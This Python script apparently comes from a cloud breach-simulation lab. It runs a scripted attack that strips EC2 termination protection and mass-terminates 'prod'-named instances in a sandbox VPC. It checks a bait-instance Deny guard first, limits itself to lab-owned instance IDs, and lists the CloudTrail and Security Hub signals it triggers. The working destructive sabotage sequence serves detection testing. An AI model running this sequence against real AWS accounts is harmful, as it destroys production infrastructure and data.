# FILE: attack.py
"""
ATOMIC_EC2_MASS_TERMINATE - Automated Post-Exploitation Attack Script
Executes a 3-phase attack chain (T1578.003 Delete Cloud Instance):
  Phase 1 - Credential bootstrap + STS validation
  Phase 2 - EC2 instance discovery with tag partitioning + Deny-guard safety assertion
  Phase 3 - Sequential termination-protection removal + single mass TerminateInstances call
"""
import sys
import time
import random
import json
import pathlib

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError


# ── Resource names: single source of truth ───────────────────────────────────
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- names will fall back to outputs")

_R   = _NAMES.get("resources", {})
_PKS = _NAMES.get("pulumi_export_keys", {})


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_lab_role(role_arn, session_name, region, max_attempts=6):
    """Assume the lab's role from the tenant session. A freshly created role can
    return AccessDenied for a few seconds while IAM propagates, so retry."""
    sts = _base_session(region).client("sts")
    last = None
    for attempt in range(1, max_attempts + 1):
        try:
            c = sts.assume_role(RoleArn=role_arn, RoleSessionName=session_name, DurationSeconds=3600)["Credentials"]
            return boto3.Session(
                aws_access_key_id=c["AccessKeyId"],
                aws_secret_access_key=c["SecretAccessKey"],
                aws_session_token=c["SessionToken"],
                region_name=region,
            )
        except ClientError as exc:
            last = exc
            if exc.response["Error"]["Code"] in ("AccessDenied", "InvalidClientTokenId") and attempt < max_attempts:
                time.sleep(5)
                continue
            raise
    raise RuntimeError(f"AssumeRole {role_arn} failed: {last}")


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json."""
    return _R.get(key, default)


def _p(infra, key, default=""):
    """Resolve a dynamic value: pulumi_export_keys lookup -> infra dict -> default."""
    export_key = _PKS.get(key, key)
    return infra.get(export_key) or default


# ── Helpers ───────────────────────────────────────────────────────────────────

def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


# ── Entry point ───────────────────────────────────────────────────────────────

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    ATOMIC_EC2_MASS_TERMINATE attack chain.

    Required outputs (Pulumi stack exports):
      prod_ops_role_arn           - the lab's prod-ops role; assumed from the connected role
      sandbox_vpc_id              - VPC containing the four lab instances
      target_web_01_instance_id   - EC2 instance ID for prod-web-01 (tagged)
      target_app_01_instance_id   - EC2 instance ID for prod-app-01 (tagged)
      target_db_01_instance_id    - EC2 instance ID for prod-db-01 (tagged)
      bait_bastion_01_instance_id - EC2 instance ID for prod-bastion-01 (untagged bait)
    """

    # ── Resolve required outputs ──────────────────────────────────────────────
    # Credentials come directly from outputs (standard keys, not in pulumi_export_keys)
    _set_tenant_credentials(outputs)
    prod_ops_role_arn    = _p(outputs, "prod_ops_role_arn")

    # Dynamic instance IDs via _p() -> pulumi_export_keys -> outputs
    target_web_01_id    = _p(outputs, "target_web_01_instance_id")
    target_app_01_id    = _p(outputs, "target_app_01_instance_id")
    target_db_01_id     = _p(outputs, "target_db_01_instance_id")
    bait_bastion_01_id  = _p(outputs, "bait_bastion_01_instance_id")

    # VPC ID for filtering - not in pulumi_export_keys, read directly from outputs
    sandbox_vpc_id = outputs.get("sandbox_vpc_id")

    # Static values from resource_names.json (never hardcode these literals)
    scenario_tag_value = _r("scenario_tag_value", "atomic-ec2-mass-terminate")

    missing = [
        name for name, val in [
            ("prod_ops_role_arn",           prod_ops_role_arn),
            ("target_web_01_instance_id",    target_web_01_id),
            ("target_app_01_instance_id",    target_app_01_id),
            ("target_db_01_instance_id",     target_db_01_id),
            ("bait_bastion_01_instance_id",  bait_bastion_01_id),
            ("sandbox_vpc_id",               sandbox_vpc_id),
        ] if not val
    ]
    if missing:
        raise RuntimeError(f"Missing required stack outputs: {', '.join(missing)}")

    # Authoritative set of lab-owned instance IDs - NEVER act on any other instance
    lab_instance_ids = {target_web_01_id, target_app_01_id, target_db_01_id, bait_bastion_01_id}
    target_ids = [target_web_01_id, target_app_01_id, target_db_01_id]
    target_labels = {
        target_web_01_id: "target-web-01 (prod-web-01)",
        target_app_01_id: "target-app-01 (prod-app-01)",
        target_db_01_id:  "target-db-01  (prod-db-01)",
    }

    # =========================================================================
    # PHASE 1 - Credential Bootstrap
    # T1578.003 - bootstrap ops_session from compromised ops automation credentials
    # =========================================================================
    print_step("Phase 1 - Credential Bootstrap (T1578.003)")
    print_step("Assuming the lab's prod-ops-role from the connected role")

    ops_session = _assume_lab_role(prod_ops_role_arn, "ec2-mass-terminate", region)
    sts = ops_session.client("sts")
    ec2 = ops_session.client("ec2")

    # Step 1/7 - STS GetCallerIdentity: confirm credential validity before continuing
    print_step("Step 1/7 - STS GetCallerIdentity: validating prod-ops-role credentials")
    try:
        identity = sts.get_caller_identity()
        print_ok(f"Credential valid - Account: {identity['Account']}, ARN: {identity['Arn']}")
    except ClientError as e:
        raise RuntimeError(f"Phase 1 credential validation failed: {e}")

    op_delay(2, 4)
    phase_delay()

    # =========================================================================
    # PHASE 2 - Discovery and Safety Gate
    # T1578.003 - enumerate VPC instances by tag, assert Deny fires on untagged bait
    # =========================================================================
    print_step("Phase 2 - Discovery and Safety Gate (T1578.003)")

    # Step 2/7 - DescribeInstances filtered by sandbox VPC
    # Bulk enumeration by the ops automation identity from an unexpected source IP is an IOC
    print_step(f"Step 2/7 - DescribeInstances: enumerating instances in VPC {sandbox_vpc_id}")
    try:
        resp = ec2.describe_instances(
            Filters=[{"Name": "vpc-id", "Values": [sandbox_vpc_id]}]
        )
    except ClientError as e:
        raise RuntimeError(f"DescribeInstances failed: {e}")

    # Partition discovered instances into tagged lab targets vs untagged bait
    # Only instances whose IDs appear in lab_instance_ids are considered
    tagged_ids_found = []
    bait_ids_found   = []
    for reservation in resp.get("Reservations", []):
        for inst in reservation.get("Instances", []):
            iid = inst["InstanceId"]
            if iid not in lab_instance_ids:
                # Not a lab-owned instance - skip; never act on client infrastructure
                continue
            tags = {t["Key"]: t["Value"] for t in inst.get("Tags", [])}
            if "MayaTrailScenario" in tags:
                tagged_ids_found.append(iid)
            else:
                bait_ids_found.append(iid)

    print_ok(f"Discovered instances - tagged lab targets: {tagged_ids_found}")
    print_ok(f"Discovered instances - untagged bait: {bait_ids_found}")

    # Assert expected lab topology before proceeding
    expected_tagged = set(target_ids)
    if set(tagged_ids_found) != expected_tagged:
        raise RuntimeError(
            f"Tag partition mismatch - expected tagged={expected_tagged}, "
            f"got={set(tagged_ids_found)}"
        )
    if bait_bastion_01_id not in bait_ids_found:
        raise RuntimeError(
            f"Bait instance {bait_bastion_01_id} not found in untagged set; "
            "lab topology inconsistent"
        )

    op_delay(2, 5)

    # Step 3/7 - Safety gate: TerminateInstances on bait-bastion-01 (MUST be denied)
    # The prod-ops-role-policy Deny fires when MayaTrailScenario tag is absent.
    # NOTE: this is a SEPARATE call from the mass terminate below; batching all 4
    # IDs in one request causes the entire batch to fail before any instance terminates.
    print_step(
        f"Step 3/7 - Safety gate: TerminateInstances on bait-bastion-01 "
        f"({bait_bastion_01_id}) - expecting UnauthorizedOperation"
    )
    bait_terminated_unexpectedly = False
    try:
        ec2.terminate_instances(InstanceIds=[bait_bastion_01_id])
        bait_terminated_unexpectedly = True
    except ClientError as e:
        code = e.response["Error"]["Code"]
        if code in ("UnauthorizedOperation", "AccessDenied"):
            # Expected - Deny guard fired correctly; CloudTrail records errorCode
            print_ok(
                f"[OK] Deny guard fired as expected ({code}) on untagged bait-bastion-01 - "
                "CloudTrail entry generated with errorCode UnauthorizedOperation"
            )
        else:
            raise RuntimeError(f"Unexpected error on bait termination attempt: {e}")

    if bait_terminated_unexpectedly:
        # IAM policy is misconfigured or missing - abort to protect client infrastructure
        raise RuntimeError(
            "SAFETY ABORT: Deny guard did NOT fire on untagged bait instance. "
            "IAM policy missing or misconfigured. Aborting to protect client infrastructure."
        )

    op_delay(1, 3)
    phase_delay()

    # =========================================================================
    # PHASE 3 - Mass Terminate
    # T1578.003 - disable API termination protection on each target, then single mass call
    #
    # try/finally ensures termination-protection is re-enabled on any instance that
    # had it disabled if the mass TerminateInstances call fails mid-run, so the
    # client environment is not left with protection stripped from running instances.
    # =========================================================================
    print_step("Phase 3 - Mass Terminate (T1578.003)")

    protection_disabled = []  # track which instances have had protection removed

    try:
        # Steps 4-6/7: Disable API termination protection on each target sequentially
        # ModifyInstanceAttribute(disableApiTermination=false) is detected by Security Hub EC2.8
        step_num = 4
        for iid in target_ids:
            label = target_labels[iid]
            print_step(
                f"Step {step_num}/7 - ModifyInstanceAttribute: disable termination protection "
                f"on {label} ({iid})"
            )
            try:
                ec2.modify_instance_attribute(
                    InstanceId=iid,
                    Attribute="disableApiTermination",
                    Value="false",
                )
                protection_disabled.append(iid)
                print_ok(f"Termination protection disabled on {iid} ({label})")
            except ClientError as e:
                raise RuntimeError(
                    f"ModifyInstanceAttribute failed for {iid} ({label}): {e}"
                )
            op_delay(2, 4)
            step_num += 1

        # Step 7/7: Mass TerminateInstances - all 3 targets in a single API call
        # Single-call mass termination immediately following 3 ModifyInstanceAttribute calls
        # is a high-fidelity IOC for destructive ransomware/sabotage tradecraft
        print_step(f"Step 7/7 - TerminateInstances (mass): {target_ids}")
        try:
            terminate_resp = ec2.terminate_instances(InstanceIds=target_ids)
            for ti in terminate_resp.get("TerminatingInstances", []):
                prev = ti["PreviousState"]["Name"]
                curr = ti["CurrentState"]["Name"]
                print_ok(f"  {ti['InstanceId']}: {prev} -> {curr}")
            # Once TerminateInstances succeeds, instances are shutting down;
            # protection_disabled list is cleared so the finally block skips re-enabling
            protection_disabled.clear()
        except ClientError as e:
            raise RuntimeError(f"TerminateInstances failed: {e}")

        op_delay(5, 10)

        # Poll DescribeInstances until all 3 instances reach 'terminated' state (timeout 120s)
        print_step("Polling for termination completion (timeout 120s)")
        deadline = time.time() + 120
        confirmed = False
        while time.time() < deadline:
            try:
                poll_resp = ec2.describe_instances(
                    InstanceIds=target_ids,
                    Filters=[{"Name": "instance-state-name", "Values": ["terminated"]}],
                )
            except ClientError as e:
                print_err(f"DescribeInstances poll error: {e}")
                time.sleep(5)
                continue

            terminated_count = sum(
                1
                for r in poll_resp.get("Reservations", [])
                for i in r.get("Instances", [])
            )
            print_ok(f"  {terminated_count}/{len(target_ids)} instances confirmed terminated")

            if terminated_count >= len(target_ids):
                confirmed = True
                print_ok("All target instances terminated successfully")
                break
            time.sleep(5)

        if not confirmed:
            print_err(
                "Timeout waiting for termination confirmation - instances may still be "
                "shutting down; pulumi destroy will reconcile already-terminated state"
            )

    finally:
        # Revert: re-enable termination protection on any instance that had it disabled
        # but was NOT subsequently terminated (e.g. TerminateInstances raised an error).
        # If protection_disabled is empty the mass-terminate succeeded and there is nothing to revert.
        if protection_disabled:
            print_step(
                f"Revert: re-enabling termination protection on {len(protection_disabled)} "
                "instance(s) that were not terminated"
            )
            for iid in protection_disabled:
                label = target_labels.get(iid, iid)
                try:
                    # Check current instance state before reverting - only revert running instances
                    state_resp = ec2.describe_instances(InstanceIds=[iid])
                    state = "unknown"
                    for r in state_resp.get("Reservations", []):
                        for inst in r.get("Instances", []):
                            state = inst["State"]["Name"]
                    if state in ("terminated", "shutting-down"):
                        print_ok(f"  {iid} ({label}) is already {state} - no revert needed")
                        continue
                    ec2.modify_instance_attribute(
                        InstanceId=iid,
                        Attribute="disableApiTermination",
                        Value="true",
                    )
                    print_ok(f"  Termination protection re-enabled on {iid} ({label})")
                except ClientError as re_err:
                    print_err(f"  Failed to re-enable protection on {iid} ({label}): {re_err}")

    phase_delay()

    # ── Summary ───────────────────────────────────────────────────────────────
    print("\n" + "=" * 64)
    print("ATTACK CHAIN SUMMARY - ATOMIC_EC2_MASS_TERMINATE (T1578.003)")
    print("=" * 64)
    audit_events = [
        "GetCallerIdentity          sts.amazonaws.com          Phase 1",
        "DescribeInstances          ec2.amazonaws.com          Phase 2 - VPC enum",
        f"TerminateInstances         ec2.amazonaws.com          Phase 2 - DENIED "
        f"bait {bait_bastion_01_id} [errorCode: UnauthorizedOperation]",
        f"ModifyInstanceAttribute    ec2.amazonaws.com          Phase 3 - "
        f"disableApiTermination x3 [{', '.join(target_ids)}]",
        f"TerminateInstances         ec2.amazonaws.com          Phase 3 - "
        f"mass terminate [{', '.join(target_ids)}]",
        "DescribeInstances          ec2.amazonaws.com          Phase 3 - termination poll",
    ]
    for ev in audit_events:
        print(f"  [+] {ev}")
    print()
    print("Detection sources activated:")
    print("  CloudTrail           - all 6 event types above")
    print("  Security Hub EC2.8   - ModifyInstanceAttribute disableApiTermination (x3)")
    print("  AWS Config           - EC2 instance state-change to terminated (x3)")
    print("  EventBridge          - EC2 Instance State-change Notification (x3)")
    print("  AWS Health           - EC2 instance state-change notifications (x3)")
    print()
    print("Cleanup: pulumi destroy reconciles already-terminated target instances")
    print("         and destroys all remaining lab infrastructure")
    print("=" * 64)
